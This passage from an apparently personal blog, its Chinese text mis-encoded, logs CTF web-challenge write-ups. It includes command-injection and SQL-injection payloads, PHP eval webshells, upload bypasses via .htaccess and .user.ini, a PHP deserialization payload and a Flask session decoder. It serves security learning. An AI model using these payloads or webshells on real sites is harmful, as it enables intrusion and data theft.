rel="noopener">https://www.runoob.com/php/php-preg_match.html</a></p><h1 id="2021-02-01"><a href="#2021-02-01" class="headerlink" title="2021-02-01"></a>2021-02-01</h1><p>é»‘é©¬æ•™ç¨‹p86-p96</p><h1 id="2021-02-02"><a href="#2021-02-02" class="headerlink" title="2021-02-02"></a>2021-02-02</h1><h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p>ä¹Ÿæ˜¯ä¸€ä¸ªå…³äºpingçš„é¢˜ç›®</p><p>ç›´æ¥1;cat /flagä¸€æŠŠæ¢­</p><h1 id="2021-02-03"><a href="#2021-02-03" class="headerlink" title="2021-02-03"></a>2021-02-03</h1><p>ï¼Ÿï¼Ÿï¼Ÿ</p><h1 id="2021-02-04"><a href="#2021-02-04" class="headerlink" title="2021-02-04"></a>2021-02-04</h1><p>å°å¹´å¿«ä¹</p><h1 id="2021-02-10"><a href="#2021-02-10" class="headerlink" title="2021-02-10"></a>2021-02-10</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><pre><code>æˆ‘å®¶èœåˆ€ä¸¢äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‰¾ä¸€ä¸‹ä¹ˆeval($_POST[&quot;Syc&quot;]);</code></pre><p>è¿™åº”è¯¥ç›´æ¥å¯†ç Sycè¿æ¥å°±è¡Œäº†å§</p><p>è·Ÿå½•ä¸‹å¾—åˆ°flagï¼š</p><p>flag{26664be8-9ad5-4c5b-ba11-2584c6c5f937}</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>é¦–å…ˆä¼šåœ¨æºä»£ç é‡Œé¢å‘ç°åœ¨å‰ç«¯å‘ˆç°é¡µé¢æ²¡æœ‰çš„éœ€è¦ç‚¹å‡»çš„æ–‡ä»¶ï¼Œsecret.phpï¼Œæ‰“å¼€ä»¥åä¼šæ˜¾ç¤ºï¼šIt doesnâ€™t come from â€˜<a href="https://www.Sycsecret.com&#39;å…³äºå‰ä¸€ä¸ªè·³è½¬è¿‡æ¥çš„è¿æ¥æ˜¯ç”±refererå†³å®šçš„ï¼Œå°±å¥½æ¯”å¾ˆå¤šæ‹‰äººçš„æ´»åŠ¨ï¼Œåº”è¯¥ä¹Ÿæ˜¯åˆ¤æ–­refereræ¥è®¡æ•°çš„ï¼Œå½“æˆ‘æ”¹å®Œrefererå¤´ä»¥åï¼Œä¼šæ˜¾ç¤ºï¼šPlease" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;å…³äºå‰ä¸€ä¸ªè·³è½¬è¿‡æ¥çš„è¿æ¥æ˜¯ç”±refererå†³å®šçš„ï¼Œå°±å¥½æ¯”å¾ˆå¤šæ‹‰äººçš„æ´»åŠ¨ï¼Œåº”è¯¥ä¹Ÿæ˜¯åˆ¤æ–­refereræ¥è®¡æ•°çš„ï¼Œå½“æˆ‘æ”¹å®Œrefererå¤´ä»¥åï¼Œä¼šæ˜¾ç¤ºï¼šPlease</a> use â€œSycloverâ€ browserä¹Ÿå°±æ˜¯è¯´ï¼Œè®©æˆ‘ç”¨sycloveræµè§ˆå™¨æ¥æè¿™ä¸ªï¼Œå…³äºåæ˜ æµè§ˆå™¨çš„ä¿¡æ¯å¥½åƒæ˜¯user-agentåœ¨webäºŒçº§é‡Œé¢ä¼šæ¶‰åŠè¿™ä¸€æ–¹é¢çš„çŸ¥è¯†ï¼Œå®Œæˆä¿®æ”¹æµè§ˆå™¨ä¿¡æ¯åï¼Œæ˜¾ç¤ºï¼šNo!!! you can only read this locally!!!è¿™åº”è¯¥æ˜¯xforwaredforä¼ªåè®®æ·»åŠ ä¸€ä¸ª127.0.0.1å°±okï¼Œå¾—åˆ°ï¼šflag{692f0abe-00c2-47ec-a5f9-2001d860b4f5}</p><p>è€ƒæŸ¥çŸ¥è¯†ç‚¹ï¼šhttpå¤´ä¿¡æ¯é‡Œé¢æ¯ä¸ªçš„ç†è§£</p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>å³ä¸Šè§’ç‚¹å‡»payflagï¼Œæºä»£ç é‡Œé¢å‡ºç°ï¼š</p><pre><code>&lt;!--    ~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) {    $password = $_POST[&#39;password&#39;];    if (is_numeric($password)) {        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    }elseif ($password == 404) {        echo &quot;Password Right!&lt;/br&gt;&quot;;    }}--&gt;</code></pre><p>postä¼ å‚å¹¶ä¸”=404åŒæ—¶æ»¡è¶³ä¸èƒ½ä¸ºæ•°å­—ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å­—ç¬¦ä¸²ä»£æ›¿404e1ï¼Œhackbaræ„é€ å³å¯ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€å¥è¯ï¼šOnly Cuitâ€™s students can buy the FLAGï¼ŒæŠ“åŒ…å°†useræ”¹ä¸º1å³å¯ã€‚å‡ºç°æç¤ºå­—æ ·ï¼Œè®©æˆ‘æ”¯ä»˜flagï¼ŒæŒ‰ç…§æç¤ºè¿˜éœ€è¦postä¼ å…¥æœ‰moneyï¼Œæ‰€ä»¥password=404e&amp;money=1e9å³å¯ï¼šflag{f7fed39d-bd40-4607-a830-6d8026fc962d}</p><h1 id="2021-03-13"><a href="#2021-03-13" class="headerlink" title="2021-03-13"></a>2021-03-13</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>hintsï¼šå› ä¸ºæ¯æ¬¡çŒ«çŒ«éƒ½åœ¨æˆ‘é”®ç›˜ä¸Šä¹±è·³ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸€ä¸ªè‰¯å¥½çš„å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯</p><p>burpå­—å…¸ï¼š</p><pre><code>.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B403%E6%9C%8813%E6%97%A50901_1.png" alt></p><p>åœ¨æ­¤å¤„è½½å…¥å­—å…¸æˆ–è€…å¾¡å‰‘æŠŠçº¿ç¨‹å¼€ä½ç‚¹ï¼Œéƒ½å¯ä»¥æ‰«æåˆ°<a href="http://www.zipæ–‡ä»¶ï¼Œä¸‹è½½å³å¯" target="_blank" rel="noopener">www.zipæ–‡ä»¶ï¼Œä¸‹è½½å³å¯</a></p><p>index.phpä¸­çš„é‡ç‚¹å†…å®¹ä¸º</p><pre><code>&lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;</code></pre><p>å°†getä¼ å…¥çš„å‚æ•°selectçš„å€¼ååºåˆ—åŒ–</p><p>class.phpå†…å®¹</p><pre><code>&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>æœªå®Œå¾…ç»­</p><h1 id="2021-03-16"><a href="#2021-03-16" class="headerlink" title="2021-03-16"></a>2021-03-16</h1><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a><a href="https://blog.csdn.net/qq_42967398/article/details/103512717?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1328655.9839.16158640888136911&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control" target="_blank" rel="noopener">[RoarCTF 2019]Easy Calc</a></h2><p><strong>è€ƒç‚¹ï¼šPHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</strong></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714" target="_blank" rel="noopener">wp1</a></p><p>å³é”®æŸ¥çœ‹æºä»£ç </p><pre><code>&lt;!--I&#39;ve set up WAF to ensure security.--&gt;&lt;script&gt;    $(&#39;#calc&#39;).submit(function(){        $.ajax({            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),            type:&#39;GET&#39;,            success:function(data){                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;            &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;${data}            &lt;/div&gt;`);            },            error:function(){                alert(&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;);            }        })        return false;    })&lt;/script&gt;</code></pre><p>æ‰“å¼€calc.phpæ–‡ä»¶</p><pre><code>&lt;?phperror_reporting(0);//ä¸æ˜¾ç¤ºä»»ä½•æŠ¥é”™if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt; </code></pre><p>ç»•è¿‡æ–¹å¼ï¼š</p><p>å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼š</p><pre><code>http://www.xxx.com/index.php?num=phpinfo()</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼(æˆ–è€…éæ³•å­—ç¬¦)ï¼š</p><pre><code>http://www.xxx.com/index.php? num = phpinfo()</code></pre><p>è¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚</p><p>å‡½æ•°åˆ©ç”¨ï¼š</p><p>scandir()å‡½æ•°åˆ—å‡º å‚æ•°ç›®å½• ä¸­çš„æ–‡ä»¶å’Œç›®å½•ï¼Œè¦ä¸ç„¶æˆ‘ä»¬æ€ä¹ˆçŸ¥é“flagåœ¨å“ªã€‚</p><p>chrï¼ˆï¼‰å‡½æ•°ï¼Œå°†asciiç è¿›è¡Œè½¬ç </p><p><a href="https://www.runoob.com/php/func-filesystem-file-get-contents.html" target="_blank" rel="noopener">file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</a></p><p><a href="https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&fromid=99077&fr=aladdin" target="_blank" rel="noopener">asciiç </a></p><p>æ„é€ å‚æ•°</p><pre><code>calc.php? num=var_dump(scandir(chr(47)))calc.php? num=var_dump(scandir(/)</code></pre><p>æ¥æ˜¾ç¤ºæ ¹ç›®å½•</p><pre><code>calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))calc.php?%20num=file_get_contents(/flagg)</code></pre><p>æ–¹æ³•äºŒï¼š<a href="https://www.jianshu.com/p/357bfe8429ff" target="_blank" rel="noopener">httpèµ°ç§æ”»å‡»</a></p><h1 id="2021-03-19ç»­2021-03-13"><a href="#2021-03-19ç»­2021-03-13" class="headerlink" title="2021-03-19ç»­2021-03-13"></a>2021-03-19ç»­2021-03-13</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP-1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP-1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h2><p>æ ¹æ®ä»£ç å¾—çŸ¥username=admin&amp;password=100ï¼Œæ‰€ä»¥å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå¹¶è¾“å‡ºåºåˆ—åŒ–ä»¥åçš„å†…å®¹</p><pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;}</code></pre><p>åˆå› ä¸ºæ˜¯getä¼ å…¥å‚æ•°select</p><p>åˆå› ä¸º__wakeupå‡½æ•°ä¼šå°†usernameçš„å€¼æ”¹ä¸ºguessæ‰€ä»¥å°†nameåé¢çš„å±æ€§å€¼æ”¹ä¸º3ï¼Œåˆå› ä¸º</p><p>privateå±æ€§åºåˆ—åŒ–:%00ç±»å%00æˆå‘˜å<br>protectå±æ€§åºåˆ—åŒ–:%00*%00æˆå‘˜å</p><p>æ‰€ä»¥ï¼š</p><pre><code>/?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre><p>å¾—åˆ°flag</p><h1 id="2021-03-22"><a href="#2021-03-22" class="headerlink" title="2021-03-22"></a>2021-03-22</h1><h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>ç”¨bpæŠ“åŒ…é’ˆå¯¹å…¶åé¢çš„æ–‡ä»¶è¿›è¡Œçˆ†ç ´ï¼Œå­—å…¸ç”¨çš„çš„3æœˆ13å·åšphpååºåˆ—åŒ–ç”¨åˆ°çš„å­—å…¸ï¼Œä¼šå¾—åˆ°index.php.bak</p><p>åœ¨bpä¸­ç›´æ¥æŸ¥çœ‹å“åº”ï¼š</p><pre><code>&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) {    $key = $_GET[&#39;key&#39;];    if(!is_numeric($key)) {        exit(&quot;Just num!&quot;);    }    $key = intval($key);    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key == $str) {        echo $flag;    }}else {    echo &quot;Try to find out source file!&quot;;}?&gt;</code></pre><p><a href="https://www.runoob.com/php/php-intval-function.html" target="_blank" rel="noopener">PHP intval() å‡½æ•°</a></p><p>?key=123</p><h1 id="2021-4-20"><a href="#2021-4-20" class="headerlink" title="2021-4-20"></a>2021-4-20</h1><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>è¿™é“é¢˜åé¢çš„ä¸¤ä¸ªå¥—å¨ƒåˆ†åˆ«æ˜¯getå’Œpostçš„md5ç¢°æ’</p><p>a[]=1&amp;b[]=2ï¼Œåˆ©ç”¨æ•°ç»„æ¥ç»•è¿‡å³å¯</p><p>è€Œæ­¤é¢˜ç›®çš„å…³é”®åœ¨äºç¬¬ä¸€æ­¥çš„ï¼š.</p><p>è€ƒç‚¹sqlæ³¨å…¥ï¼šmd5($password,true)</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a><strong>è¯­æ³•</strong></h3><p>â€‹         <strong>md5(*string,raw*)</strong></p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>string</td><td>å¿…éœ€ã€‚è¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>raw</td><td>å¯é€‰ã€‚1.é»˜è®¤ä¸å†™ä¸ºFALSEã€‚32ä½16è¿›åˆ¶çš„å­—ç¬¦ä¸²TRUEã€‚2.16ä½åŸå§‹äºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²</td></tr></tbody></table><p>è€Œè¿™é‡Œé‡è¦çš„å­—ç¬¦è½¬åˆ™æ˜¯ffifdyopï¼Œå½“ä»–åœ¨æ•°æ®åº“ä¸­åˆ™ä¼šè¢«å½“åš16è¿›åˆ¶å¤„ç†è€Œæ­¤æ—¶æ˜¯å…ˆç»è¿‡md5åŠ å¯†æˆ32ä½çš„16è¿›åˆ¶åäº†çš„æ‰€ä»¥ä¼šè¢«ç¼–è¯‘æˆâ€œ6xxxxxxxâ€ ï¼Œä»è€Œå®ç°äº†ä¸‡èƒ½é’¥åŒ™</p><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>é—®é¢˜ç‚¹åœ¨äºå‰ç«¯ç»™å®šçš„ä¸¤å¼ ç…§ç‰‡çš„åç¼€ï¼Œå°±æ˜¯ä½ è¦åœ¨æŠ“åŒ…çš„æ—¶å€™ä¿®æ”¹.htaccessçš„content_typeï¼šimage/png</p><p>åŒæ—¶å…¶å†…å®¹ä¸º</p><pre><code>&lt;FilesMatch &quot;fuck&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>æ„æ€å°±æ˜¯å°†æ‰€æœ‰åå­—ä¸­å«æœ‰fuckå­—ç¬¦çš„æ–‡ä»¶éƒ½ä»¥phpæ‰§è¡Œï¼Œç„¶åä¸Šä¼ fuck.pngå°±å¯ä»¥äº†</p><p>ç”¨èœåˆ€è¿æ¥ï¼Œæˆ‘çš„èšå‰‘ä¹±ç äº†</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>è¿™ä¹Ÿæ˜¯ä¸€é“æ–‡ä»¶ä¸Šä¼ é¢˜ç›®ï¼Œè€ƒæŸ¥çš„çŸ¥è¯†ç‚¹æ˜¯.user.iniæ–‡ä»¶çš„ä¹Ÿå°±æ˜¯å¯ä»¥ç”¨æˆ·è‡ªå®šä¹‰çš„php.iniæ–‡ä»¶ï¼Œé¦–å…ˆè¿™ä¸ªé¢˜ç›®ä¼šå…ˆä½¿ç”¨exif_imagetypeå‡½æ•°æ¥åˆ¤æ–­ä½ æ‰€ä¸Šä¼ çš„å›¾åƒçš„ç±»å‹ï¼Œé¢å¯¹è¿™ç§å‡½æ•°é‡‡ç”¨å›¾ç‰‡é©¬ç»•è¿‡å½“æ—¶å³å¯ï¼ŒåŒæ—¶.user.iniæ–‡ä»¶ä¹Ÿéœ€è¦è¿›è¡Œä¸€ä¸ªå›¾å½¢åŒ–çš„å¤„ç†ï¼š</p><ul><li>JPG ï¼šFF D8 FF E0 00 10 4A 46 49 46</li><li>GIF(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š47 49 46 38 39 61</li><li>PNGï¼š 89 50 4E 47</li></ul><p>è¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯GIF89aï¼š</p><pre><code>GIF89aauto_prepend_file=hack.jpg</code></pre><p>å›¾ç‰‡é©¬åˆ¶ä½œå‘½ä»¤ï¼š</p><pre><code>copy 1.jpg/a + 1.php/b hack.jpg</code></pre><p>1.phpä¸­éœ€è¦é‡æ–°ç¼–è¾‘ä¸ºï¼š</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;666&#39;]);&lt;/script&gt;</code></pre><p>å› ä¸ºåç«¯ä¼šå¯¹ä½ çš„&lt;?æ¥è¿›è¡Œä¸€ä¸ªæ£€æµ‹</p><p>ä¸Šä¼ æˆåŠŸååœ¨ç»™å‡ºçš„è·¯å¾„ä¸‹è®¿é—®index.phpæ¥è§¦å‘ï¼ˆå¯åŠ¨ï¼‰è¿™ä¸ª.user.iniï¼Œç„¶åpostä¼ å‚å°±è¡Œ</p><p>æ‰«ææ ¹ç›®å½•ï¼š666=var_dump(scandir(â€œ/â€œ));ï¼Œæˆ‘ä»¬å¯ä»¥å¯ä»¥çœ‹è§ä¸€ä¸ªå«flagçš„æ–‡ä»¶<br>æ‰“å°ï¼š666=var_dump(file_get_contents(â€œ/flagâ€));</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>å…ˆåˆ©ç”¨sqlfuzzå­—å…¸æ¥çœ‹çœ‹å“ªäº›å‡½æ•°è¢«ç¦ç”¨ï¼š</p><p>å‘ç°orï¼Œorder,information_schemaè¢«è¿‡æ»¤ï¼Œä½†æ˜¯orderå¯ä»¥é€šè¿‡Orderæ¥è¿›è¡Œç»•è¿‡ã€‚</p><p>æ„é€ payload</p><pre><code>name=1&#39; Order by 4#&amp;pw=1234name=1&#39; Order by 3#&amp;pw=1234</code></pre><p>å¯ä»¥åˆ¤æ–­æœ‰3åˆ—ï¼Œé€šå¸¸ä¸ºidï¼Œusernameï¼Œpw</p><p><strong>æœ¬é¢˜è€ƒç‚¹ï¼šè”åˆæŸ¥è¯¢æ‰€æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®</strong></p><p>å› ä¸ºç»™å‡ºäº†æºç åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥ä¼šçŸ¥é“åœ¨ä¼ å…¥pwåä¼šè¢«$pw=md5ï¼ˆ$passwordï¼‰</p><p>æ‰€ä»¥å…ˆæ„é€ </p><pre><code>name=admin&#39; union select 0,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code></pre><p>æ¥ä¸´æ—¶åˆ›å»ºä¸€ä¸ªæ•°æ®</p><p>md5=123456ï¼Œåˆå› ä¸ºåé¢#å°†â€™æ³¨é‡Šæ‰äº†ï¼Œè€Œpwä¸ºå¦ä¸€ä¸ªå‚æ•°å¹¶ä¸åœ¨åŒä¸€rowï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒä¼šè¢«æ³¨é‡Šæ‰</p><h1 id="2021-4-22"><a href="#2021-4-22" class="headerlink" title="2021-4-22"></a>2021-4-22</h1><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>å…ˆæ³¨å†Œè´¦å·ï¼Œç„¶åç™»é™†ï¼Œåœ¨/changeé¡µé¢ä¸‹æŸ¥çœ‹æºä»£ç ï¼Œå¾—åˆ°ï¼š<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51826_1.png" alt></p><p>ä¹Ÿå°±æ˜¯pythonçš„è½»å‹webå¼€å‘æ¡†æ¶ï¼šflaskï¼Œè¿™é‡Œæ˜¯æŒ‡æ˜äº†å‡ ä¸ªå­é¡µé¢ï¼Œé’ˆå¯¹äºflaskæ¡†æ¶çš„sessionæ˜¯ä¿å­˜åœ¨å®¢æˆ·ç«¯çš„cookieä¸­çš„ï¼Œflaskä»…ä»…å¯¹æ•°æ®è¿›è¡Œäº†ç­¾åã€‚ä¼—æ‰€å‘¨çŸ¥çš„æ˜¯ï¼Œç­¾åçš„ä½œç”¨æ˜¯é˜²ç¯¡æ”¹ï¼Œè€Œæ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚è€Œflaskå¹¶æ²¡æœ‰æä¾›åŠ å¯†æ“ä½œï¼Œæ‰€ä»¥å…¶sessionçš„å…¨éƒ¨å†…å®¹éƒ½æ˜¯å¯ä»¥åœ¨å®¢æˆ·ç«¯è¯»å–çš„ï¼Œè¿™å°±å¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚</p><p>å…·ä½“å¯å‚è€ƒï¼š<br><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">https://xz.aliyun.com/t/3569</a><br><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html#</a></p><p>æ­¥éª¤ï¼š</p><p>1.å¾—åˆ°session</p><p>2.è§£å¯†sessionï¼š</p><p>è„šæœ¬ï¼ˆäº²æµ‹å¥½ç”¨ï¼‰ï¼š</p><pre><code># flaskæ¡†æ¶ï¼Œé’ˆå¯¹sessionçš„è§£å¯†è„šæœ¬# ç”¨æ³•python hctf_admin.py [sessionå€¼]import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#39;.&#39;, 1)    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)    decompress = False    if payload.startswith(b&#39;.&#39;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#39;Could not base64 decode the payload because of &#39;                         &#39;an exception&#39;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&#39;Could not zlib decompress the payload before &#39;                             &#39;decoding the payload&#39;)    return session_json_serializer.loads(payload)if __name__ == &#39;__main__&#39;:    print(decryption(sys.argv[1].encode()))</code></pre><p>å¾—åˆ°ï¼š<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51831_2.png" alt></p><pre><code>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;1b917c9c3d1e4ed8bd25e61e7244e9768b2748b5e473d8da4543a3af3ab19736dcc10cb00cce46dbb944f3120f7faf739997fbd7e1a9168cd0aba8ff4a1083a5&#39;, &#39;csrf_token&#39;: b&#39;c8230e23f995910f94fca46c22c2b6af10562efc&#39;, &#39;image&#39;: b&#39;6Yku&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;}</code></pre><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬æƒ³è¦åŠ å¯†ä¼ªé€ ç”Ÿæˆè‡ªå·±æƒ³è¦çš„sessionè¿˜éœ€è¦çŸ¥é“SECRET_KEY</p><p>3.æ ¹æ®å¾—åˆ°çš„ç½‘ç«™æºä»£ç ç»§ç»­æŸ¥æ‰¾ï¼š</p><p>å…¶ä¸­åœ¨config.pyä¸­æ‰¾åˆ°äº†SECRET_KEYï¼šckj123</p><p>é€šè¿‡index.htmlä¸­å¾—çŸ¥session[â€˜nameâ€™] == â€˜adminâ€™å³å¯å¾—åˆ°flag</p><p>4.ä¿®æ”¹åºåˆ—åŒ–ä¸­çš„å†…å®¹ï¼š</p><pre><code>{&#39;_fresh&#39;: True, &#39;_id&#39;: 